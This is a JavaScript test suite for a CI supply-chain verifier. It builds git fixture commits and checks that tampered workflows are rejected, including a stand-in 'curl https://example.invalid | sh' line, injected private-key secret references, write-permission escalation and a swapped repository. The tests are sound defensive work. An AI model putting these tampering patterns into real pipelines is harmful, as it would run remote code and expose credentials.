import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import {
  AUTHORIZED_BASE, ORIGINAL_CANDIDATE, TRUSTED_RECONCILIATION_BASE,
  AMENDMENT_CONTROLLED_FILES, CANDIDATE_OWNED_FILES, COMPOSED_CI_BASE,
  composeCandidateCi, composeFinalCi, composeTrustedCi, validateDualBaseScope,
} from "./validate-p1a-threat-model.mjs";
import { validateCertificationBundle } from "./validate-p1a-certification-accounting.mjs";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
if (process.env.P1A_TRUSTED_EXECUTION_ROOT) {
  assert.equal(
    root,
    path.resolve(process.env.P1A_TRUSTED_EXECUTION_ROOT),
    "dual-base verifier is not executing from trusted checkout",
  );
  assert.ok(process.env.P1A_CANDIDATE_DATA_ROOT, "candidate data root absent");
  assert.notEqual(
    root,
    path.resolve(process.env.P1A_CANDIDATE_DATA_ROOT),
    "candidate root cannot impersonate trusted dual-base checkout",
  );
}
const temporary = mkdtempSync(path.join(tmpdir(), "p1a-dual-base-"));
const repository = path.join(temporary, "repository");
const run = (cwd, args, options = {}) => execFileSync(args[0], args.slice(1), {
  cwd, encoding: "utf8", stdio: ["pipe", "pipe", "pipe"], ...options,
}).trim();
run(temporary, ["git", "clone", "-q", "--no-hardlinks", root, repository]);
const git = (...args) => run(repository, ["git", ...args]);
git("config", "user.email", "p1a-dual-base@example.invalid");
git("config", "user.name", "P1A dual-base fixture");

function entry(commit, file) {
  const match = /^(\d+)\s+blob\s+([0-9a-f]{40})\t/.exec(git("ls-tree", commit, "--", file));
  assert.ok(match, `${file}: unsupported fixture entry`);
  return { mode: match[1], blob: match[2] };
}

let sequence = 0;
function trustedWorkflow() {
  const env = { ...process.env, GIT_INDEX_FILE: path.join(temporary, "workflow-index") };
  run(repository, ["git", "read-tree", TRUSTED_RECONCILIATION_BASE], { env });
  for (const file of AMENDMENT_CONTROLLED_FILES) {
    const blob = run(repository, ["git", "hash-object", "-w", path.join(root, file)], { env });
    run(repository, ["git", "update-index", "--add", "--cacheinfo", "100644", blob, file], { env });
  }
  const tree = run(repository, ["git", "write-tree"], { env });
  return run(repository, ["git", "commit-tree", tree, "-p", TRUSTED_RECONCILIATION_BASE, "-m", "trusted amendment fixture"], { env });
}
const workflowSha = trustedWorkflow();

function candidate({ omit, add, mutate, ciAppend = "", ciTransform, omitOriginalParent = false } = {}) {
  sequence += 1;
  const env = { ...process.env, GIT_INDEX_FILE: path.join(temporary, `index-${sequence}`) };
  run(repository, ["git", "read-tree", workflowSha], { env });
  for (const file of CANDIDATE_OWNED_FILES) {
    if (file === ".github/workflows/ci.yml") continue;
    if (file === omit) continue;
    const source = entry(ORIGINAL_CANDIDATE, file);
    run(repository, ["git", "update-index", "--add", "--cacheinfo", source.mode, source.blob, file], { env });
  }
  if (omit !== ".github/workflows/ci.yml") {
    const trustedCi = git("show", `${workflowSha}:.github/workflows/ci.yml`);
    const marker = "      - name: P1-A trusted-bootstrap exact-SHA identity";
    const addition = "      - name: P1-A validator control suite (hermetic)\n        run: pnpm test:p1a-threat-model\n\n";
    const composedCi = `${trustedCi.replace(marker, `${addition}${marker}`)}${ciAppend}`;
    const resolvedCi = ciTransform ? ciTransform(composedCi) : composedCi;
    const blob = run(repository, ["git", "hash-object", "-w", "--stdin"], { env, input: `${resolvedCi}\n` });
    run(repository, ["git", "update-index", "--add", "--cacheinfo", "100644", blob, ".github/workflows/ci.yml"], { env });
  }
  if (omit) run(repository, ["git", "update-index", "--force-remove", "--", omit], { env });
  for (const file of [mutate, add].filter(Boolean)) {
    const blob = run(repository, ["git", "hash-object", "-w", "--stdin"], { env, input: `fixture ${file}\n` });
    run(repository, ["git", "update-index", "--add", "--cacheinfo", "100644", blob, file], { env });
  }
  const tree = run(repository, ["git", "write-tree"], { env });
  const parents = ["-p", workflowSha];
  if (!omitOriginalParent) parents.push("-p", ORIGINAL_CANDIDATE);
  const commit = run(repository, ["git", "commit-tree", tree, ...parents, "-m", `fixture ${sequence}`], { env });
  if (omit !== ".github/workflows/ci.yml" && mutate !== ".github/workflows/ci.yml") {
    assert.ok(git("show", `${commit}:.github/workflows/ci.yml`).includes("pnpm test:p1a-threat-model"));
  }
  return commit;
}

const validCandidate = candidate();
const invoke = (overrides = {}) => validateDualBaseScope({
  git, candidateSha: validCandidate, evidenceBaseSha: AUTHORIZED_BASE,
  reconciliationBaseSha: TRUSTED_RECONCILIATION_BASE,
  originalCandidateSha: ORIGINAL_CANDIDATE, workflowSha, ...overrides,
});
const mutation = (file) => () => invoke({ candidateSha: candidate({ mutate: file }) });
const omission = (file) => () => invoke({ candidateSha: candidate({ omit: file }) });

const identity = {
  candidateSha: "1".repeat(40), workflowSha: "2".repeat(40), baseSha: "3".repeat(40),
  evidenceBaseSha: "4".repeat(40), reconciliationBaseSha: "5".repeat(40),
  originalCandidateSha: "6".repeat(40), runtimePin: "7".repeat(40),
};
const zeros = { failed: 0, skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0 };
const nested = { suite: "p1-a-trusted-certification", ...identity, required: 15, executed: 15, passed: 15, ...zeros, evidenceDigest: "a".repeat(64), verifierDigest: "b".repeat(64) };
const integration = { suite: "p1-a-trusted-verifier-controls", ...identity, required: 21, executed: 21, passed: 21, ...zeros, crossRepositoryCiAuthentication: "VERIFIED", nestedEvidenceDigest: nested.evidenceDigest, nestedVerifierDigest: nested.verifierDigest };
const dualAccounting = { suite: "p1-a-dual-base-verifier-controls", ...identity, required: 29, executed: 29, passed: 29, ...zeros };

const cases = [
  ["dual_base_valid_reconciliation", () => invoke(), false],
  ["wrong_evidence_model_base", () => invoke({ evidenceBaseSha: "0".repeat(40) }), true],
  ["wrong_trusted_reconciliation_base", () => invoke({ reconciliationBaseSha: AUTHORIZED_BASE }), true],
  ["wrong_original_candidate", () => invoke({ originalCandidateSha: TRUSTED_RECONCILIATION_BASE }), true],
  ["wrong_candidate_sha", () => invoke({ candidateSha: "f".repeat(40) }), true],
  ["candidate_omits_authorized_evidence", omission(CANDIDATE_OWNED_FILES[1]), true],
  ["candidate_omits_resolved_ci", omission(".github/workflows/ci.yml"), true],
  ["candidate_adds_unauthorized_file", () => invoke({ candidateSha: candidate({ add: "unauthorized.txt" }) }), true],
  ["candidate_modifies_trusted_workflow", mutation(".github/workflows/p1a-certify.yml"), true],
  ["candidate_injects_ci_secret", () => invoke({ candidateSha: candidate({ ciAppend: "\n# ${{ secrets.P1A_RUNTIME_APP_PRIVATE_KEY }}" }) }), true],
  ["candidate_modifies_trusted_verifier", mutation("scripts/validate-p1a-threat-model.mjs"), true],
  ["candidate_modifies_accounting_controls", mutation("scripts/validate-p1a-certification-accounting.mjs"), true],
  ["candidate_weakens_credential_cleanup", mutation(".github/workflows/p1a-certify.yml"), true],
  ["candidate_weakens_token_revocation", mutation(".github/workflows/p1a-certify.yml"), true],
  ["trusted_blob_substitution", mutation("scripts/test-p1a-trusted-verifier.mjs"), true],
  ["hidden_file_behind_trusted_exclusion", () => invoke({ candidateSha: candidate({ add: ".github/hidden.yml" }) }), true],
  ["unexpected_trusted_file", mutation(".github/CODEOWNERS"), true],
  ["unexpected_historical_file", () => invoke({ originalCandidateSha: TRUSTED_RECONCILIATION_BASE }), true],
  ["mutable_branch_reference", () => invoke({ reconciliationBaseSha: "codex/bt-1" }), true],
  ["invalid_ancestry", () => invoke({ candidateSha: ORIGINAL_CANDIDATE }), true],
  ["candidate_not_descended_from_reconciliation", () => invoke({ candidateSha: AUTHORIZED_BASE }), true],
  ["copied_original_blobs_without_original_ancestry", () => invoke({ candidateSha: candidate({ omitOriginalParent: true }) }), true],
  ["evidence_digest_mismatch", () => validateCertificationBundle({ nested, dual: dualAccounting, integration: { ...integration, nestedEvidenceDigest: "c".repeat(64) } }, identity), true],
  ["verifier_digest_mismatch", () => validateCertificationBundle({ nested, dual: dualAccounting, integration: { ...integration, nestedVerifierDigest: "c".repeat(64) } }, identity), true],
  ["incomplete_scope_accounting", omission(CANDIDATE_OWNED_FILES.at(-1)), true],
  ["missing_dual_base_identity", () => invoke({ evidenceBaseSha: undefined }), true],
  ["duplicate_or_contradictory_bases", () => invoke({ evidenceBaseSha: TRUSTED_RECONCILIATION_BASE }), true],
  ["local_success_without_protected_remote", () => validateCertificationBundle({ nested, dual: dualAccounting, integration: { ...integration, notRun: 1, passed: 20 } }, identity), true],
  ["stale_evidence_changed_candidate", () => validateCertificationBundle({ nested, integration, dual: dualAccounting }, { ...identity, candidateSha: "8".repeat(40) }), true],
];

const baselineCi = `${git("show", `${COMPOSED_CI_BASE}:.github/workflows/ci.yml`)}\n`;
const trustedCi = `${git("show", `${workflowSha}:.github/workflows/ci.yml`)}\n`;
const validCi = `${git("show", `${validCandidate}:.github/workflows/ci.yml`)}\n`;
const positiveCases = [
  ["exact_baseline_recognized", () => assert.equal(git("rev-parse", `${COMPOSED_CI_BASE}:.github/workflows/ci.yml`), "9a3f1a04f99e83d9dad84cf384d86117a7d282f1")],
  ["baseline_plus_trusted_fragment", () => assert.equal(trustedCi, composeTrustedCi(baselineCi))],
  ["baseline_plus_candidate_fragment", () => assert.ok(composeCandidateCi(baselineCi).includes("pnpm test:p1a-threat-model"))],
  ["baseline_plus_both_fragments", () => assert.equal(validCi, composeFinalCi(baselineCi))],
  ["immutable_candidate_checkout", () => assert.ok(validCi.includes("ref: ${{ github.event.pull_request.head.sha || github.sha }}"))],
  ["read_only_permissions", () => { assert.ok(validCi.includes("permissions:\n  contents: read")); assert.ok(!validCi.includes("contents: write")); }],
  ["exact_historical_commit_acquired", () => assert.ok(validCi.includes(`ref: ${ORIGINAL_CANDIDATE}`))],
  ["historical_identity_and_blobs_verified", () => { assert.ok(validCi.includes("cat-file -t")); assert.ok(validCi.includes("P1A_ORIGINAL_TEST_BLOB")); assert.ok(validCi.includes("DarksiedCEO/zbestmedia")); }],
  ["original_compatibility_suite_executes", () => assert.ok(validCi.includes("node scripts/test-p1a-trusted-verifier.mjs"))],
  ["baseline_remainder_exact", () => invoke()],
];

const replaceOnce = (source, needle, replacement) => {
  assert.equal(source.split(needle).length - 1, 1, `fixture needle count: ${needle}`);
  return source.replace(needle, replacement);
};
const negativeCases = [
  ["missing_trusted_fragment", (ci) => replaceOnce(ci, "      - name: Acquire exact original P1-A candidate object\n", "")],
  ["missing_candidate_fragment", (ci) => replaceOnce(ci, "      - name: P1-A validator control suite (hermetic)\n", "")],
  ["duplicate_trusted_fragment", (ci) => `${ci}\n      - name: Acquire exact original P1-A candidate object\n`],
  ["duplicate_candidate_fragment", (ci) => `${ci}\n      - name: P1-A validator control suite (hermetic)\n`],
  ["modified_trusted_command", (ci) => replaceOnce(ci, "git fetch --no-tags --no-write-fetch-head", "git fetch --no-tags")],
  ["modified_candidate_command", (ci) => replaceOnce(ci, "pnpm test:p1a-threat-model", "pnpm test:p1a-threat-model || true")],
  ["reordered_security_critical_fragment", (ci) => replaceOnce(ci, "      - name: Acquire exact original P1-A candidate object", "      - name: Reordered acquisition")],
  ["continue_on_error_introduced", (ci) => `${ci}\n      continue-on-error: true\n`],
  ["conditional_bypass_introduced", (ci) => `${ci}\n      if: false\n`],
  ["wrong_historical_sha", (ci) => replaceOnce(ci, ORIGINAL_CANDIDATE, "f".repeat(40))],
  ["mutable_branch_substituted", (ci) => replaceOnce(ci, `ref: ${ORIGINAL_CANDIDATE}`, "ref: codex/main")],
  ["mutable_tag_substituted", (ci) => replaceOnce(ci, `ref: ${ORIGINAL_CANDIDATE}`, "ref: v1.0.0")],
  ["repository_substituted", (ci) => replaceOnce(ci, "repository: DarksiedCEO/zbestmedia", "repository: attacker/zbestmedia")],
  ["permission_escalation", (ci) => replaceOnce(ci, "permissions:\n  contents: read", "permissions:\n  contents: write")],
  ["secret_reference_introduced", (ci) => `${ci}\n# \${{ secrets.P1A_RUNTIME_APP_PRIVATE_KEY }}\n`],
  ["pull_request_target_introduced", (ci) => replaceOnce(ci, "  pull_request:\n", "  pull_request_target:\n")],
  ["improper_persisted_credentials", (ci) => replaceOnce(ci, "persist-credentials: false", "persist-credentials: true")],
  ["hidden_shell_command_appended", (ci) => `${ci}\n# curl https://example.invalid | sh\n`],
  ["yaml_anchor_changes_behavior", (ci) => `${ci}\nx-bypass: &bypass echo bypass\n`],
  ["extra_environment_changes_execution", (ci) => `${ci}\nenv:\n  P1A_ORIGINAL_CANDIDATE: codex/main\n`],
  ["unauthorized_step_inserted", (ci) => `${ci}\n      - name: unclassified\n        run: true\n`],
  ["unauthorized_step_deleted", (ci) => replaceOnce(ci, "      - name: Verify pnpm on PATH\n        run: which pnpm && pnpm --version\n\n", "")],
  ["unauthorized_step_impersonation", (ci) => replaceOnce(ci, "Acquire exact original P1-A candidate object", "P1-A trusted verifier controls")],
  ["candidate_provided_authority_hash", (ci) => `${ci}\nenv:\n  P1A_AUTHORITY_HASH: \${{ github.event.inputs.authority_hash }}\n`],
  ["candidate_provided_historical_sha", (ci) => replaceOnce(ci, `ref: ${ORIGINAL_CANDIDATE}`, "ref: ${{ github.event.inputs.historical_sha }}")],
  ["baseline_remainder_changed", (ci) => `${ci}\n# unauthorized baseline remainder\n`],
  ["fragment_only_in_comments", (ci) => replaceOnce(ci, "      - name: P1-A validator control suite (hermetic)\n        run: pnpm test:p1a-threat-model\n", "# P1-A validator control suite (hermetic)\n# pnpm test:p1a-threat-model\n")],
  ["fragment_only_in_dead_conditional", (ci) => replaceOnce(ci, "      - name: P1-A validator control suite (hermetic)\n", "      - name: P1-A validator control suite (hermetic)\n        if: ${{ false }}\n")],
  ["trusted_fragment_candidate_script", (ci) => replaceOnce(ci, "git fetch --no-tags --no-write-fetch-head .p1a-original-candidate", "node candidate/untrusted.mjs")],
  ["accounting_without_both_authorities", (ci) => replaceOnce(ci, "      - name: Acquire exact original P1-A candidate object\n", "      - name: authority accounting claims complete\n")],
];

let passed = 0;
let failed = 0;
let positivePassed = 0;
let negativePassed = 0;
try {
  for (const [name, operation, shouldReject] of cases) {
    let rejected = false;
    let detail = "";
    try { operation(); } catch (error) { rejected = true; detail = error.message; }
    if (rejected === shouldReject) { passed += 1; console.log(`PASS ${name}`); }
    else { failed += 1; console.error(`FAIL ${name}${detail ? `: ${detail}` : ""}`); }
  }
  for (const [name, operation] of positiveCases) {
    try { operation(); positivePassed += 1; console.log(`PASS composed_positive:${name}`); }
    catch (error) { failed += 1; console.error(`FAIL composed_positive:${name}: ${error.message}`); }
  }
  for (const [name, transform] of negativeCases) {
    let rejected = false;
    try { invoke({ candidateSha: candidate({ ciTransform: transform }) }); }
    catch { rejected = true; }
    if (rejected) { negativePassed += 1; console.log(`PASS composed_negative:${name}`); }
    else { failed += 1; console.error(`FAIL composed_negative:${name}: mutation survived`); }
  }
} finally { rmSync(temporary, { recursive: true, force: true }); }
console.log(JSON.stringify({
  suite: "p1-a-dual-base-verifier-controls",
  candidateSha: process.env.P1A_CANDIDATE_SHA ?? null,
  workflowSha: process.env.P1A_WORKFLOW_SHA ?? null,
  baseSha: process.env.P1A_TRUST_BASE_SHA ?? null,
  evidenceBaseSha: process.env.P1A_EVIDENCE_BASE_SHA ?? null,
  reconciliationBaseSha: process.env.P1A_RECONCILIATION_BASE_SHA ?? null,
  originalCandidateSha: process.env.P1A_ORIGINAL_CANDIDATE_SHA ?? null,
  runtimePin: process.env.P1A_TRUST_RUNTIME_PIN ?? null,
  required: cases.length, executed: cases.length, passed, failed,
  skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
}));
console.log(JSON.stringify({
  suite: "p1-a-composed-ci-authority-controls",
  positiveRequired: 10, positiveExecuted: positiveCases.length, positivePassed,
  negativeRequired: 30, negativeExecuted: negativeCases.length, negativePassed,
  behaviorChangingMutationSurvivors: negativeCases.length - negativePassed,
  failed: (10 - positivePassed) + (30 - negativePassed),
  skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
}));
if (failed || passed !== cases.length) process.exitCode = 1;
